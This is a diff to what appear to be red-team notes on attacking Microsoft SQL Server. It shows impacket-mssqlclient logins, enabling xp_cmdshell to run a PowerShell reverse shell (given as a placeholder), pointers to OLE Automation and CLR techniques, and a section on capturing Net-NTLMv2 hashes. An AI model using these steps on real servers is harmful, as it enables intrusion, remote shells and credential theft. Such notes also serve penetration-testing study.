@@ -63,7 +63,7 @@ EXECUTE AS LOGIN = '<user>'
 try this first
 	`enable_xp_cmdshell
 
-Command Execution Workflow
+xp_cmdshell
 ```bash
 # Authenticate
 impacket-mssqlclient 'domain'/'user':'password'@<target_ip> -windows-auth
@@ -82,6 +82,11 @@ SQL> RECONFIGURE;
 # Reverse shell
 SQL> EXECUTE xp_cmdshell '<command(base64_powershell_revshell)>';
 ```
+
+OLE Automation
+SQL Common Language Runtime 
+	For these two, see [[13 Microsoft SQL Server]] red teaming notes
+
 
 ## Capture Net-NTLMv2 Hash
 If no interesting data exists in the database and you cannot run commands, you can try and get MSSQL to connect to your host and authenticate, and capture the challenge / response
